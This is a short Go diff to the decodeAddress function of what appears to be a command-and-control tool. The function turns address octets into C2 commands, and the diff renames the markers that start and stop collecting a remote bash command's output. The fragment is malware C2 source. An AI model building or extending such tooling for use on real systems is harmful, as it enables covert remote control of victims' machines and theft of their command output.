@@ -73,15 +73,15 @@ func decodeAddress(octets []string, b *int, m *string, c *bool, lsb *[]byte) str
 			}
 		} else { // If the current mode is C2 communication, interpret the bytes as a command.
 			command := string(bytes[:])
-
-			if *c && command != "fin" && command != "beg" {
+			if *c && command != "/f/" && command != "/b/" {
 				// While collecting, continue appending all received bytes to the ls byte slice instead of interpreting them as commands
 				*lsb = append((*lsb), []byte(command)...)
 			} else {
 				switch command {
-				case "beg": // Begin collecting the output bytes of the bash command
+				case "/b/": // Begin collecting the output bytes of the bash command
+					fmt.Printf("[!] Collecting output of the executed command.")
 					*c = true
-				case "fin": // Finish collecting the output bytes of the bash command, and output the gathered data.
+				case "/f/": // Finish collecting the output bytes of the bash command, and output the gathered data.
 					fmt.Printf("~$ %v", string(*lsb))
 					*lsb = []byte{}
 					*c = false
